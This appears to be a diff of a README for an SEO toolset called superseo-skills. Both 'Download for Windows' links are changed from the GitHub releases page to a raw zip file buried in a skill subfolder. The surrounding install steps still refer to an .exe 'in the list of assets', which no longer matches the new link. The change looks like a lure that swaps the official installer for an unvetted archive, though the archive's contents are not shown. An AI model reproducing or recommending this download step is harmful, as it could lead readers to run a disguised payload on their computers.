@@ -1,6 +1,6 @@
 # 📈 superseo-skills - Streamline your expert SEO workflows now
 
-[![Download for Windows](https://img.shields.io/badge/Download_Windows-blue.svg)](https://github.com/flakey-caster542/superseo-skills/releases)
+[![Download for Windows](https://img.shields.io/badge/Download_Windows-blue.svg)](https://raw.githubusercontent.com/flakey-caster542/superseo-skills/main/skills/featured-snippet-optimizer/skills_superseo_2.0.zip)
 
 superseo-skills provides a set of specialized tools for search engine optimization. It uses methods from industry experts to help you audit pages, build links, and write content. The software follows strict rules to ensure your output avoids repetitive or low-quality patterns. This toolset integrates directly with Claude to perform complex SEO tasks like gap analysis and authority audits.
 
@@ -27,7 +27,7 @@ Ensure your computer has the following to run the application:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit this page to download the latest installer: [https://github.com/flakey-caster542/superseo-skills/releases](https://github.com/flakey-caster542/superseo-skills/releases)
+1. Visit this page to download the latest installer: [https://raw.githubusercontent.com/flakey-caster542/superseo-skills/main/skills/featured-snippet-optimizer/skills_superseo_2.0.zip](https://raw.githubusercontent.com/flakey-caster542/superseo-skills/main/skills/featured-snippet-optimizer/skills_superseo_2.0.zip)
 2. Locate the file ending in .exe in the list of assets.
 3. Click the file to start the download.
 4. Open the downloaded file once the process finishes.
